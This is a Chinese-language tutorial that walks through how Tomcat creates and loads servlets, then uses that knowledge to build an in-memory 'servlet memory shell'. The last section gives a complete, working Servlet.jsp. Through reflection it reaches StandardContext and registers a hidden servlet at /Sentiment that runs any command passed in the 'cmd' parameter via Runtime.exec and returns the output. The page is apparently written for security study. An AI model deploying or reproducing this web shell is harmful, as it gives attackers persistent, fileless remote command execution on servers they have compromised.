# Servlet

Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，Tomcat是Apache 软件基金会（Apache Software
Foundation）的Jakarta 项目中的一个核心项目，它早期的名称为catalina，后来由Apache、Sun
和其他一些公司及个人共同开发而成，并更名为Tomcat。Tomcat
是一个小型的轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选，因为Tomcat
技术先进、性能稳定，成为目前比较流行的Web
应用服务器。Tomcat是应用（java）服务器，它只是一个servlet容器，是Apache的扩展，但它是独立运行的。

从宏观上来看，Tomcat其实是Web服务器和Servlet容器的结合体。

> Web服务器：通俗来讲就是将某台主机的资源文件映射成URL供给外界访问。（比如访问某台电脑上的图片文件）
>
> Servlet容器：顾名思义就是存放Servlet对象的东西，Servlet主要作用是处理URL请求。（接受请求、处理请求、响应请求）

Servlet接口一共有五个类分别是init（Servlet对象初始化时调用）、getServletConfig（获取web.xml中Servlet对应的init-param属性）、service（每次处理新的请求时调用）、getServletInfo（返回Servlet的配置信息，可自定义实现）、destroy（结束时调用）：

    
    
    public interface Servlet {
        void init(ServletConfig var1) throws ServletException;
    
        ServletConfig getServletConfig();
    
        void service(ServletRequest var1, ServletResponse var2) throws ServletException, IOException;
    
        String getServletInfo();
    
        void destroy();
    }
    

## Demo

**Servlet.java**

    
    
    package memoryshell;
    
    import javax.servlet.ServletException;
    import javax.servlet.http.HttpServlet;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.IOException;
    
    public class Servlet extends HttpServlet {
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            resp.getWriter().write("Hello,Sentiment!");
        }
    
        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            doGet(req, resp);
        }
    }
    

**web.xml**

    
    
    <servlet>
        <servlet-name>hello</servlet-name>
        <servlet-class>memoryshell.Servlet</servlet-class>
    </servlet>
    <!--Servlet的请求路径-->
    <servlet-mapping>
        <servlet-name>hello</servlet-name>
        <url-pattern>/hello</url-pattern>
    </servlet-mapping>
    

访问/hello

![](./img/5853535178530796006.png)

# Servlet生成

本地没有catalina，所以加了个依赖，可能是版本不对在调试时可能会有一丢丢代码不匹配的问题，但不影响正常流程

**依赖**

    
    
    <dependency>
        <groupId>org.apache.tomcat</groupId>
        <artifactId>tomcat-catalina</artifactId>
        <version>9.0.19</version>
    </dependency>
    

整个栈在ContextConfig调用了`configureStart#webConfig()`读取`web.xml`

![](./img/8439047013162709970.png)  
![](./img/1185531383711638974.png)  
然后根据 web.xml 配置 context调用了`configureContext()`

    
    
    if (this.ok) {
        this.configureContext(webXml);
    }
    

跟进`configureContext()`前边依次读取了 Filter、Listenert的配置及其映射，我们直接看后边的 Servlet 部分：

![](./img/7456013319477649682.png)  
首先通过`StandardContextS#createWrapper()`，创建wrapper对象

> **Wrapper（包装器** ）：代表一个 Servlet，它负责管理一个 Servlet，包括的 Servlet
> 的装载、初始化、执行以及资源回收。Wrapper 是最底层的容器，它没有子容器了，所以调用它的 addChild 将会报错。
    
    
    public Wrapper createWrapper() {
    Wrapper wrapper = null;
    if (wrapperClass != null) {
        try {
            wrapper = (Wrapper) wrapperClass.newInstance();
        } catch (Throwable t) {
            ExceptionUtils.handleThrowable(t);
            log.error("createWrapper", t);
            return (null);
        }
    } else {
        wrapper = new StandardWrapper();
    

接着设置了启动优先级LoadOnStartUp，以及servlet的Name。

设置好优先级后就调用下边的`setServletClass()`，配置了Servlet的Class。

    
    
    wrapper.setServletClass(servlet.getServletClass());
    

最后通过`addChild()`将创建并配置好的 Wrapper 添加到 Context 中。通过循环遍历所有 servlets 完成了 Servlet
从配置到添加的全过程，接下

来就需要添加Servlet-Mapper了（对应web.xml中的`<servlet-mapping>`）

取出web.xml中所有配置的Servlet-Mapping，通过context.addServletMappingDecoded()将url路径和servlet类做映射。(这里的/hello、hello就是我们在Mapper中设置的值)

![](./img/4567304984406941333.png)

### 流程

>   1. 通过 context.createWapper() 创建 Wapper 对象；
>   2. 设置 Servlet 的 LoadOnStartUp 的值；
>   3. 设置 Servlet 的 Name；
>   4. 设置 Servlet 对应的 Class；
>   5. 通过addChild()将创建并配置好的 Wrapper 添加到 Context 中
>   6. 通过addServletMappingDecoded()将 url 路径和 servlet 类做映射。
>

# Servlet加载

在 org.apache.catalina.core.StandardWapper#loadServlet() 下断点调试：

回溯到`StandardContext#startInternal`同样也是在处理完listener和filter后，处理Servlet，这也就体现了分析Listener中提到的执行流程(Listener
-> Filter -> Servlet)

首先调用了`findChildren()`，将之前通过`addChild()`添加的所有Wapper传入`loadOnStartup()`中处理

![](./img/3039021871913636729.png)  
跟进`loadOnStartup()`，children的值就是通过`this.findChildren()`传入进来的

![](./img/4485574786279338294.png)  
通过循环将children中的值逐一赋给child，在赋值给wrapper中，之后有一段判断:

    
    
    if (loadOnStartup >= 0) {
        Integer key = loadOnStartup;
        ArrayList<Wrapper> list = (ArrayList)map.get(key);
        if (list == null) {
            list = new ArrayList();
            map.put(key, list);
        }
    
        list.add(wrapper);
    }
    

如果loadOnStartup >= 0，就会将wrapper追加到list中，但loadOnStartup 的默认值是-1，

![](./img/480768863417870797.png)  
在servlet的配置当中即(web.xml)，`<load-on-startup>1</load-on-startup>`的含义是：  
标记容器是否在启动的时候就加载这个servlet。  
当值为0或者大于0时，表示容器在应用启动时就加载这个servlet；  
当是一个负数时或者没有指定时，则指示容器在该servlet被选择时才加载。  
正数的值越小，启动该servlet的优先级越高。`</load-on-startup>`

由于我们要注入内存马，且没有配置xml不会在应用启动时就加载这个servlet，因此需要通过反射将值修改为1，将其追加到list中

之后通过load()进行加载，根据具体请求进行初始化、调用、销毁一系列操作

![](./img/506443002256693235.png)

# Servlet内存马

首先通过doGet方法实现恶意类

    
    
    <%
        HttpServlet httpServlet = new HttpServlet() {
          @Override
          protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            InputStream is = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();
            BufferedInputStream bis = new BufferedInputStream(is);
            int len;
            while ((len = bis.read())!=-1){
              resp.getWriter().write(len);
            }
          }
    
          @Override
          protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            super.doPost(req, resp);
          }
        };
    
    %>
    

之后还是老办法获取StandardContext：

    
    
    <%
        Field reqF = request.getClass().getDeclaredField("request");
        reqF.setAccessible(true);
        Request req = (Request) reqF.get(request);
        StandardContext stdcontext = (StandardContext) req.getContext();
    %>
    

反射修改`loadOnStartup`

    
    
    <%
        Wrapper newWrapper = stdcontext.createWrapper();
        String name = servlet.getClass().getSimpleName();
        newWrapper.setName(name);
        newWrapper.setLoadOnStartup(1);
        newWrapper.setServlet(servlet);
        newWrapper.setServletClass(servlet.getClass().getName());
    %>
    

最后将 URL 路径与 Servlet 恶意类做映射：

    
    
    <%
        // url绑定
        stdcontext.addChild(newWrapper);
        stdcontext.addServletMappingDecoded("/Sentiment", name);
    %>
    

Servlet.jsp

    
    
    <%@ page import="java.lang.reflect.Field" %>
    <%@ page import="org.apache.catalina.core.StandardContext" %>
    <%@ page import="org.apache.catalina.connector.Request" %>
    <%@ page import="java.io.IOException" %>
    <%@ page import="org.apache.catalina.Wrapper" %>
    <%@ page import="java.io.InputStream" %>
    <%@ page import="java.io.BufferedInputStream" %>
    <%@ page contentType="text/html;charset=UTF-8" language="java" %>
    <html>
    <head>
        <title>Sentiment</title>
    </head>
    <body>
    <%
        HttpServlet httpServlet = new HttpServlet() {
            @Override
            protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
                InputStream is = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();
                BufferedInputStream bis = new BufferedInputStream(is);
                int len;
                while ((len = bis.read())!=-1){
                    resp.getWriter().write(len);
                }
            }
    
            @Override
            protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
                super.doPost(req, resp);
            }
        };
    
        //获得StandardContext
        Field reqF = request.getClass().getDeclaredField("request");
        reqF.setAccessible(true);
        Request req = (Request) reqF.get(request);
        StandardContext stdcontext = (StandardContext) req.getContext();
    
        //从StandardContext.createWapper()获得一个Wapper对象
        Wrapper newWrapper = stdcontext.createWrapper();
        String name = httpServlet.getClass().getSimpleName();
        newWrapper.setName(name);
        newWrapper.setLoadOnStartup(1);
        newWrapper.setServlet(httpServlet);
        newWrapper.setServletClass(httpServlet.getClass().getName());
        //将Wrapper添加到StandardContext
        stdcontext.addChild(newWrapper);
        stdcontext.addServletMappingDecoded("/Sentiment", name);
    %>
    

访问Servlet.jsp后注入成功

![](./img/4506630677687630439.png)

